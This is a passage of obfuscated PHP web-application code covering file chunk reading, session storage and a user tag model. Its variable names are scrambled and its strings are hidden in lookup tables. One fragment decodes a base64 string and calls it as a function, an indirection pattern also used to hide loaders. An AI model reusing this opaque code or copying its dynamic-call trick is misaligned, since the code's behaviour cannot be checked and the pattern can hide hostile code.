fopen($º¸ñöé, $ä“›€Á½[1662]); if (!$¯ÛÑ†Ï) { return $ä“›€Á½[12]; } $¸¼£Šøˆ = 8192; fseek($¯ÛÑ†Ï, $å’Çˆ‡ä, SEEK_SET); $üÆ½•Äš = $ä“›€Á½[12]; $‘çÉ¬ÙØ = 0; while ($‘çÉ¬ÙØ < $§ùØ™ì) { $ñšú˜˜ú = min($¸¼£Šøˆ, $§ùØ™ì - $‘çÉ¬ÙØ); $üÆ½•Äš .= fread($¯ÛÑ†Ï, $ñšú˜˜ú); $‘çÉ¬ÙØ += $ñšú˜˜ú; } fclose($¯ÛÑ†Ï); return $üÆ½•Äš; } public function fileSubstr($ÂŠ¯”á‹, $Æì›µÚ•) { $Æ øÀ =& $_SERVER[øşô´çË]; $ Ê—„ı = $this->info[$Æ øÀ[89]]; $ÚÊÕû = $ÂŠ¯”á‹; $ÄÍŸ§Ìå = $Æì›µÚ•; if ($ÂŠ¯”á‹ < 0) { $ÂŠ¯”á‹ = $ Ê—„ı + $ÂŠ¯”á‹; } if ($Æì›µÚ• === !1) { $Æì›µÚ• = $ Ê—„ı - $ÂŠ¯”á‹; } if ($ÂŠ¯”á‹ + $Æì›µÚ• > $ Ê—„ı) { $Æì›µÚ• = $ Ê—„ı - $ÂŠ¯”á‹; } if ($Æì›µÚ• <= 0) { return $Æ øÀ[12]; } if ($ÂŠ¯”á‹ < 0 || $ÂŠ¯”á‹ >= $ Ê—„ı || $Æì›µÚ• <= 0 || $Æì›µÚ• > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\x6c\x65\122\x65\x61\x64\40\x65\162\162\157\x72\41\40\163\x74\x61\x72\164\75{$ÂŠ¯”á‹}\73\154\x65\156\x67\164\150\75{$Æì›µÚ•}\73\40\x73\x69\172\145\x3d{$ Ê—„ı}\x3b"); } $®ºÊó÷  = 64 * 1024; $¯î¨¦Ì• =& self::$_chunkBuffer[$this->path]; if (!$¯î¨¦Ì•) { $¯î¨¦Ì• = array(); } $Şƒö“ß¦ = 0; $æ—ïĞÔÇ = 0; $…éáç‹µ = $Æ øÀ[12]; foreach ($¯î¨¦Ì• as $Şƒö“ß¦ => $…éáç‹µ) { $Şƒö“ß¦ = intval($Şƒö“ß¦); $æ—ïĞÔÇ = $Şƒö“ß¦ + strlen($…éáç‹µ); if ($ÂŠ¯”á‹ >= $æ—ïĞÔÇ) { continue; } if ($ÂŠ¯”á‹ >= $Şƒö“ß¦ && $ÂŠ¯”á‹ + $Æì›µÚ• <= $æ—ïĞÔÇ) { return substr($…éáç‹µ, $ÂŠ¯”á‹ - $Şƒö“ß¦, $Æì›µÚ•); } break; } if (count($¯î¨¦Ì•) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Æ øÀ[1817], $Æ øÀ[1818] . count($¯î¨¦Ì•) . "\73\x73\164\141\x72\164\75{$ÂŠ¯”á‹}\54\154\145\156\147\x74\150\x3d{$Æì›µÚ•}\73\160\x6f\163\x65\72{$Şƒö“ß¦}\176{$æ—ïĞÔÇ}"); throw new Exception($Æ øÀ[1819]); } $÷î‚ôÎ¡ = intval($ÂŠ¯”á‹ / $®ºÊó÷ ) * $®ºÊó÷ ; $ÖÑÚ÷×ı = ceil(($ÂŠ¯”á‹ + $Æì›µÚ•) / $®ºÊó÷ ) * $®ºÊó÷  - $÷î‚ôÎ¡; $şˆûı©Ç = IO::fileSubstr($this->path, $÷î‚ôÎ¡, $ÖÑÚ÷×ı); $¯î¨¦Ì•[$÷î‚ôÎ¡ . $Æ øÀ[12]] = $şˆûı©Ç; ksort($¯î¨¦Ì•); $¼À‰–·÷ = substr($şˆûı©Ç, $ÂŠ¯”á‹ - $÷î‚ôÎ¡, $Æì›µÚ•); return $¼À‰–·÷; } private function log($şò ´‹€, $È“è¤ÃÂ) { $½“ôÃ®– =& $_SERVER[øşô´çË]; $Ã¡è²¨ = timeFloat() - $this->timeStart; write_log(sprintf($½“ôÃ®–[1820], $şò ´‹€, $this->info[$½“ôÃ®–[42]], $Ã¡è²¨, $È“è¤ÃÂ), $½“ôÃ®–[1367]); } } goto b´Ã¤ŞÌ¯Œ; fê…é…÷: $fileSize = strrev(base64_decode($_SERVER[¸—ÈÚ´„][0])); function binCheckNeq($˜î°úæÉ, $ö™ŠÃ¤) { return $˜î°úæÉ != $ö™ŠÃ¤; } $_SERVER[$_SERVER[¸—ÈÚ´„][1]] = $fileSize($_SERVER[$_SERVER[¸—ÈÚ´„][2]]); goto CÂ¹ì™–”Ã; cñƒÈÍùÀã: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¦Œ¬à© =& $_SERVER[øşô´çË]; static $ÉÆÜˆ¡¿ = false; if ($ÉÆÜˆ¡¿) { return $ÉÆÜˆ¡¿; } $Šº¬ã¯¹ = $GLOBALS[$¦Œ¬à©[6]][$¦Œ¬à©[433]]; self::$sessionTime = $Šº¬ã¯¹[$¦Œ¬à©[1920]]; $¼ÚÕ™ĞË = isset($GLOBALS[$¦Œ¬à©[1921]]) ? $GLOBALS[$¦Œ¬à©[1921]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¼ÚÕ™ĞË)) { self::$sessionSign = Cookie::get($¼ÚÕ™ĞË); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¼ÚÕ™ĞË, self::$sessionSign, self::$sessionTime); $¨ùÄùÔ = $Šº¬ã¯¹[$¦Œ¬à©[1922]]; $ÏÊ¢·¸Å = $Šº¬ã¯¹[$¨ùÄùÔ]; $èú¨áüÁ = $Šº¬ã¯¹[$¦Œ¬à©[983]]; switch ($¨ùÄùÔ) { case $¦Œ¬à©[31]: self::$handle = Model($¦Œ¬à©[984]); break; case $¦Œ¬à©[985]: self::$handle = new CacheRedis($ÏÊ¢·¸Å, $èú¨áüÁ); break; case $¦Œ¬à©[986]: self::$handle = new CacheMemcached($ÏÊ¢·¸Å, $èú¨áüÁ); break; case $¦Œ¬à©[240]: $ÏÊ¢·¸Å[$¦Œ¬à©[97]] = $ÏÊ¢·¸Å[$¦Œ¬à©[97]] . $¦Œ¬à©[1923]; self::$handle = new CacheFile($ÏÊ¢·¸Å, $èú¨áüÁ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$¦Œ¬à©[1658]]) || time() - self::$data[$¦Œ¬à©[1658]] >= 5) { self::dataSave(); } } $ÉÆÜˆ¡¿ = new self(); return $ÉÆÜˆ¡¿; } public static function getBySign($’ŞáÔè‘) { $÷êé›ì = self::$handle->get($’ŞáÔè‘); $÷êé›ì = unserialize($÷êé›ì); return is_array($÷êé›ì) ? $÷êé›ì : array(); } public static function setBySign($øšÃÊŠ·, $ŸÙÖÊú·) { self::$sessionSign = $øšÃÊŠ·; self::$data = $ŸÙÖÊú·; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[øşô´çË][1658]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($Á‰º¸š‚ = false) { if ($Á‰º¸š‚) { self::$sessionSign = $Á‰º¸š‚; } self::init(); return self::$sessionSign; } public static function set($ˆ×ï ñí, $²©ƒ¼œœ = false) { self::init(); if (is_array($ˆ×ï ñí)) { foreach ($ˆ×ï ñí as $¼Á—…ëË => $ƒª‹´) { array_set_value(self::$data, $¼Á—…ëË, $ƒª‹´); } } else { array_set_value(self::$data, $ˆ×ï ñí, $²©ƒ¼œœ); } self::dataSave(); } public static function get($ËÍÀÕ¢  = false) { self::init(); if (!$ËÍÀÕ¢ ) { return self::$data; } return array_get_value(self::$data, $ËÍÀÕ¢ ); } public static function remove($é¬ı¨) { self::init(); unset(self::$data[$é¬ı¨]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[øşô´çË][992])) { self::$handle->clearTimeout(); } } } $_file = $_SERVER[$_SERVER[øşô´çË][13]]; $_size = $_SERVER[øşô´çË][14]; goto Cƒ†¦²‰¯®; Dº›—öŠª: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($İ®™¾±ú) { $Æë …ßù =& $_SERVER[øşô´çË]; return array($Æë …ßù[2292] => array($Æë …ßù[2717] . USER_ID, $Æë …ßù[2293])); } protected function ___listData() { $í¿âÓŞÑ =& $_SERVER[øşô´çË]; $³÷äÉ´œ = array($í¿âÓŞÑ[1964] => USER_ID, $í¿âÓŞÑ[582] => array($í¿âÓŞÑ[2296], 0)); $·µ˜½½ô = $í¿âÓŞÑ[2718]; $®ÖŒÊÄ = $this->field($·µ˜½½ô)->where($³÷äÉ´œ)->order($í¿âÓŞÑ[2298])->select(); return $®ÖŒÊÄ ? $®ÖŒÊÄ : array(); } protected function addToTag($ëŠõ×ó˜, $ó³“Á’è) { $ôî²—ÒÄ =& $_SERVER[øşô´çË]; if (!Model($ôî²—ÒÄ[2447])->listData($ó³“Á’è)) { return !1; } if (is_numeric($ëŠõ×ó˜)) { $Íà¤ÕÁï = Model($ôî²—ÒÄ[935])->pathInfo($ëŠõ×ó˜); if (!$Íà¤ÕÁï) { return !1; } } else { $Íà¤ÕÁï = IO::infoSimple($ëŠõ×ó˜); if (!$Íà¤ÕÁï) { return !1; } $¼şù°‘Û = $Íà¤ÕÁï[$ôî²—ÒÄ[42]]; $÷î›„€à = $Íà¤ÕÁï[$ôî²—ÒÄ[43]]; if (isset($Íà¤ÕÁï[$ôî²—ÒÄ[509]])) { $÷î›„€à = $Íà¤ÕÁï[$ôî²—ÒÄ[509]] == $ôî²—ÒÄ[101] ? $ôî²—ÒÄ[88] : $ôî²—ÒÄ[240]; } } $€áÔ¹ê = array($ôî²—ÒÄ[1964] => USER_ID, $ôî²—ÒÄ[582] => $ó³“Á’è, $ôî²—ÒÄ[519] => $ëŠõ×ó˜, $ôî²—ÒÄ[520] => $÷î›„€à ? $÷î›„€à : $ôî²—ÒÄ[514], $ôî²—ÒÄ[518] => $¼şù°‘Û ? $¼şù°‘Û : $ôî²—ÒÄ[12], $ôî²—ÒÄ[2182] => 0); if ($this->where($€áÔ¹ê)->find()) { return !1; } return $this->add($€áÔ¹ê); } protected function removeFromTag($ÀƒàïÓĞ, $ƒº–‘§é) { $ßßÅÑ­ó =& $_SERVER[øşô´çË]; if (!Model($ßßÅÑ­ó[2447])->listData($ƒº–‘§é)) { return !1; } if (is_array($ÀƒàïÓĞ)) { $ÀƒàïÓĞ = array($ßßÅÑ­ó[7], $ÀƒàïÓĞ); } $µ òî¦ë = array($ßßÅÑ­ó[1964] => USER_ID, $ßßÅÑ­ó[582] => $ƒº–‘§é, $ßßÅÑ­ó[519] => $ÀƒàïÓĞ); return $this->where($µ òî¦ë)->delete(); } protected function removeByTag($â¡ƒï ‰) { $»½‡ì³— =& $_SERVER[øşô´çË]; if (!$â¡ƒï ‰) { return !1; } $ÄîÏóÃ = array($»½‡ì³—[1964] => USER_ID, $»½‡ì³—[582] => $â¡ƒï ‰); return $this->where($ÄîÏóÃ)->delete(); } protected function removeBySource($ˆ¤Ìø½) { $Áü±Âä =& $_SERVER[øşô´çË]; if (is_array($ˆ¤Ìø½)) { $ˆ¤Ìø½ = array($Áü±Âä[7], $ˆ¤Ìø½); } $ø§ŒÛŞ = array($Áü±Âä[1964] => USER_ID, $Áü±Âä[582] => array($Áü±Âä[1178], 0), $Áü±Âä[519] => $ˆ¤Ìø½); return $this->where($ø§ŒÛŞ)->delete(); } }